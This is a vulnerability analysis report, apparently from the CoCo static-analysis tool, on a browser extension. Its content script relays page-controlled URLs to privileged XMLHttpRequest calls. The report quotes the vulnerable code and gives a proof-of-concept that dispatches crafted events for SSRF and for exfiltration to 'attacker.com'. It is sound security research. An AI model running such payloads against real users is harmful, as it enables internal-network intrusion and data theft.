# CoCo Analysis: gpnamfpkffldfnlkofbbebcndfdkclpc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6 (all variations of XMLHttpRequest_url_sink and XMLHttpRequest_post_sink)

---

## Sink: document_eventListener_loadUrlContent → XMLHttpRequest_url_sink / XMLHttpRequest_post_sink

**CoCo Trace:**
Multiple flows detected from the same source to XMLHttpRequest sinks:
1. Lines 631, 633 in cs_0.js → Line 1010, 1011, 1012 in bg.js (XMLHttpRequest_url_sink)
2. Lines 631, 633 in cs_0.js → Line 1011 in bg.js (XMLHttpRequest_post_sink)

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gpnamfpkffldfnlkofbbebcndfdkclpc/opgen_generated_files/cs_0.js
Line 631: `document.addEventListener("loadUrlContent", function (event) {`
Line 633: `getBrowser().runtime.sendMessage({type: event.type, method:event.detail.method, url:event.detail.url}, function (content) {`

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gpnamfpkffldfnlkofbbebcndfdkclpc/opgen_generated_files/bg.js
Lines 1010-1012: URL manipulation and XHR operations

**Code:**

```javascript
// Content script - Entry point (cs_0.js, lines 631-640)
document.addEventListener("loadUrlContent", function (event) {
  // event.detail.method and event.detail.url are attacker-controlled
  getBrowser().runtime.sendMessage({
    type: event.type,
    method: event.detail.method,  // ← attacker-controlled
    url: event.detail.url         // ← attacker-controlled
  }, function (content) {
    var evt = document.createEvent('CustomEvent');
    evt.initCustomEvent(event.detail.resultEventType, true, true, content);
    document.dispatchEvent(evt);
  });
});

// Background script - Message handler (bg.js, lines 971-981)
getBrowser().runtime.onMessage.addListener(
  function (request, sender, sendResponse) {
    if (request.type === 'clickSimilar') {
      askPermission(request.target);
    } else if (request.type === 'loadUrlContent') {
      makeRequest(request.method, request.url, sendResponse);  // ← passes attacker data
    }
    return true;
  }
);

// Background script - Vulnerable sink (bg.js, lines 1006-1026)
function makeRequest(method, url, callback) {  // ← method and url are attacker-controlled
  var data = null;
  var xhr = new XMLHttpRequest();
  if (method === 'POST' && url.indexOf('?') > 0) {
    data = url.substring(url.indexOf('?') + 1, url.length);  // ← attacker-controlled
    url = url.substring(0, url.indexOf('?'));                // ← attacker-controlled
  }
  xhr.open(method, url, true);  // ← SINK: attacker controls method and URL
  if (method === 'POST') {
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  }
  xhr.onload = function (e) {
    callback(xhr.responseText);
  };
  xhr.onerror = function (e) {
    callback('error');
  };
  xhr.send(data);  // ← SINK: attacker controls POST data
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (document.addEventListener)

**Attack:**

```javascript
// An attacker-controlled webpage can inject this code on any Amazon/Aliexpress page
// where the content script runs (per manifest.json matches)

// SSRF attack - Force extension to make privileged cross-origin request
var event = new CustomEvent('loadUrlContent', {
  detail: {
    method: 'GET',
    url: 'http://internal-corporate-server/admin',  // Internal network access
    resultEventType: 'attackerEvent'
  }
});
document.dispatchEvent(event);

// Or exfiltrate data
var event2 = new CustomEvent('loadUrlContent', {
  detail: {
    method: 'POST',
    url: 'https://attacker.com/steal?data=sensitive',
    resultEventType: 'attackerEvent'
  }
});
document.dispatchEvent(event2);
```

**Impact:** The extension performs privileged cross-origin XMLHttpRequest on behalf of the attacker. Since extensions bypass CORS restrictions, an attacker can use this to perform SSRF attacks against internal network resources, exfiltrate data to attacker-controlled servers, or scan internal networks. The content script runs on Amazon and Aliexpress domains per the manifest, meaning any malicious script injected on these sites (e.g., via XSS or compromised ads) can exploit this vulnerability.

---
